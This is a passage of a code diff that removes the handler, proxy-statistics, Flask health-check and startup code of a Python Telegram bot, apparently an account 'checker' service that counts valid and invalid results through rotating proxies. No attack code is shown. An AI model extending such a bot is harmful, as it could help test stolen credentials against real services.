-        await db.execute("DELETE FROM user_stats")
-        await db.execute("DELETE FROM global_stats")
-        await db.commit()
-    
-    await update.message.reply_text("✅ Statistics reset.")
-
-async def back_to_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Go back to the main start menu."""
-    query = update.callback_query
-    await query.answer()
-    
-    if not await check_and_prompt_join(update, context):
-        return
-    
-    await show_welcome(update, context)
-
-# ============================================
-# CALLBACK HANDLERS
-# ============================================
-async def show_stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    if not await check_and_prompt_join(update, context):
-        return
-    
-    stats = checker_engine.get_stats()
-    proxy_stats = await proxy_manager.get_stats()
-    
-    text = f"""
-📊 *Statistics*
-Total: `{stats['total']}`
-✅ Valid: `{stats['valid']}`
-❌ Invalid: `{stats['invalid']}`
-🌐 Proxies: `{proxy_stats['alive']}/{proxy_stats['total']}`
-"""
-    await query.edit_message_text(
-        text,
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 Back", callback_data="checkers")]
-        ])
-    )
-
-async def proxy_stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    if not await check_and_prompt_join(update, context):
-        return
-    
-    stats = await proxy_manager.get_stats()
-    proxies = await proxy_manager.get_working_proxies()
-    sample = "\n".join([f"• {p}" for p in proxies[:5]]) if proxies else "No proxies available"
-    
-    await query.edit_message_text(
-        f"🌐 *Proxy Statistics*\n\n"
-        f"Total: `{stats['total']}`\n"
-        f"Working: `{stats['alive']}`\n\n"
-        f"*Sample working proxies:*\n{sample}\n\n"
-        f"{'... and ' + str(len(proxies) - 5) + ' more' if len(proxies) > 5 else ''}",
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 Back", callback_data="proxy")]
-        ])
-    )
-
-async def proxy_clear_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    if not await check_and_prompt_join(update, context):
-        return
-    
-    removed = await proxy_manager.clear_dead_proxies()
-    
-    await query.edit_message_text(
-        f"🗑️ *Dead Proxies Cleared*\n\n"
-        f"Removed `{removed}` dead proxies from the database.",
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 Back", callback_data="proxy")]
-        ])
-    )
-
-# ============================================
-# FLASK APP FOR RENDER WEB SERVICE
-# ============================================
-flask_app = Flask(__name__)
-
-@flask_app.route('/')
-def health():
-    return f"{BOT_NAME} is running!", 200
-
-@flask_app.route('/health')
-def health_check():
-    return {"status": "ok", "bot": BOT_NAME, "version": BOT_VERSION}, 200
-
-def run_flask():
-    port = int(os.environ.get('PORT', 10000))
-    logger.info(f"🌐 Flask server starting on port {port}")
-    flask_app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
-
-# ============================================
-# MAIN FUNCTION
-# ============================================
-def main():
-    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
-        logger.error("❌ BOT_TOKEN not set!")
-        return
-    
-    app = Application.builder().token(BOT_TOKEN).build()
-    
-    # Command handlers
-    app.add_handler(CommandHandler("start", start_command))
-    app.add_handler(CommandHandler("checkers", checkers_command))
-    app.add_handler(CommandHandler("proxy", proxy_command))
-    app.add_handler(CommandHandler("admin", admin_command))
-    app.add_handler(CommandHandler("broadcast", broadcast_command))
-    app.add_handler(CommandHandler("resetstats", reset_stats_command))
-    app.add_handler(CommandHandler("help", start_command))
-    app.add_handler(CommandHandler("about", start_command))
-    
-    # Callback handlers
-    app.add_handler(CallbackQueryHandler(check_membership_callback, pattern="^check_membership$"))
-    app.add_handler(CallbackQueryHandler(handle_category, pattern="^cat_"))
-    app.add_handler(CallbackQueryHandler(handle_service_selection, pattern="^svc_"))
-    app.add_handler(CallbackQueryHandler(toggle_proxy_callback, pattern="^toggle_proxy"))
-    app.add_handler(CallbackQueryHandler(show_stats_callback, pattern="^show_stats"))
-    app.add_handler(CallbackQueryHandler(proxy_stats_callback, pattern="^proxy_stats"))
-    app.add_handler(CallbackQueryHandler(proxy_clear_callback, pattern="^proxy_clear"))
-    app.add_handler(CallbackQueryHandler(back_to_start, pattern="^back_start"))
-    app.add_handler(CallbackQueryHandler(checkers_command, pattern="^checkers$"))
-    
-    # Message handlers
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-    app.add_handler(MessageHandler(filters.Document.ALL, handle_message))
-    
-    logger.info(f"🚀 {BOT_NAME} {BOT_VERSION} is LIVE!")
-    logger.info(f"📱 Bot: {BOT_USERNAME}")
-    logger.info(f"🔗 Channel: {BOT_LINK}")
-    logger.info(f"👤 Admin ID: {ADMIN_ID}")
-    
-    app.run_polling(allowed_updates=Update.ALL_TYPES)
-
-if __name__ == "__main__":
-    flask_thread = threading.Thread(target=run_flask, daemon=True)
-    flask_thread.start()
-    time.sleep(2)
-    main()
+    checker_engine.stats = {"total": 0, "valid": 0, "invalid": 
